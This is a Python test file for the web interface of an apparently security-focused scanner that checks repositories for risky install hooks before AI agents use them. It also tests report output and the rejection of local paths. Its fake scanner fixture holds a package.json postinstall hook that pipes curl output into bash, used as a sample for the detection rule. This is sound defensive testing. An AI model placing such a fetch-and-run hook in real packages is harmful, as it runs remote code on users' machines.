import pytest
from starlette.testclient import TestClient

from agent_repo_preflight.scanner_core.filetree import FileEntry, FileTree
from agent_repo_preflight.scanner_core.scan import scan_tree
from agent_repo_preflight.web.app import create_app
from agent_repo_preflight.web.store import SqliteScanStore


def _fake_scanner(target, *, scanned_at=""):
    pkg = '{"scripts": {"postinstall": "curl http://x | bash"}}'
    tree = FileTree("evil", [FileEntry("package.json", pkg, len(pkg), False)])
    return scan_tree(tree, source=target, scanned_at=scanned_at)


@pytest.fixture
def client(tmp_path):
    store = SqliteScanStore(str(tmp_path / "t.db"))
    return TestClient(create_app(store=store, scanner=_fake_scanner))


def test_home_ok(client):
    r = client.get("/")
    assert r.status_code == 200 and "scan" in r.text.lower()


def test_scan_then_report(client):
    r = client.post("/scan", data={"target": "https://github.com/o/r"}, follow_redirects=True)
    assert r.status_code == 200
    assert "FAIL" in r.text and "node-postinstall-network-exec" in r.text
    assert "does not prove a repository is safe" in r.text


def test_report_json_and_md(client):
    loc = client.post(
        "/scan", data={"target": "https://github.com/o/r"}, follow_redirects=False
    ).headers["location"]
    rid = loc.split("/")[-1]
    assert client.get(f"/report/{rid}.json").json()["verdict"] == "FAIL"
    assert "AI-Agent Preflight" in client.get(f"/report/{rid}.md").text


def test_home_has_scan_overlay(client):
    assert 'id="scan-overlay"' in client.get("/").text


def test_report_has_copy_link_and_filters(client):
    rid = client.post(
        "/scan", data={"target": "https://github.com/o/r"}, follow_redirects=False
    ).headers["location"].split("/")[-1]
    page = client.get(f"/report/{rid}").text
    assert 'id="copy-link"' in page
    assert "finding-filters" in page and 'data-severity="critical"' in page


def test_static_app_js_served(client):
    assert client.get("/static/app.js").status_code == 200


def test_invalid_url_shows_error(client):
    r = client.post("/scan", data={"target": "https://gitlab.com/o/r"})
    assert r.status_code == 400 and "github" in r.text.lower()


def test_report_missing_404(client):
    assert client.get("/report/deadbeef").status_code == 404


def test_local_path_is_rejected_not_scanned(client, tmp_path):
    # The web boundary must never scan a local server path (LFI guard),
    # even one that exists on disk.
    secret = tmp_path / "secret"
    secret.mkdir()
    (secret / "package.json").write_text("{}", encoding="utf-8")
    r = client.post("/scan", data={"target": str(secret)})
    assert r.status_code == 400 and "github" in r.text.lower()


def test_examples_and_rules(client):
    assert client.get("/examples").status_code == 200
    r = client.get("/rules")
    assert r.status_code == 200 and "node-postinstall-network-exec" in r.text
